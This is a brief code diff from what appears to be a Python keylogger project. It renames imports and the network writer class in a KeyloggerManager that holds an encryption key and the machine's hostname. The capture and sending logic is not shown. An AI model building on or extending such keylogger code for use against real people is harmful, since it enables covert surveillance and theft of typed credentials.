@@ -1,11 +1,11 @@
-from keylogger_listener import Service
+from keylogger_service import Service
 from encrypt import Encryption
 from file_writer import FileWriter
 import time
 from datetime import datetime
 import threading
 import socket
-from network_writer import NetworkSaver
+from network_writer import NetworkWriter
 
 class KeyloggerManager:
 
@@ -13,7 +13,7 @@ class KeyloggerManager:
         self.keylogger_listener = Service()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
         self.buffer = {}
         self.key = key
-        self.writer = NetworkSaver()
+        self.writer = NetworkWriter()
         self.machine_name = socket.gethostname()
         self.copied = False
         self.running = False
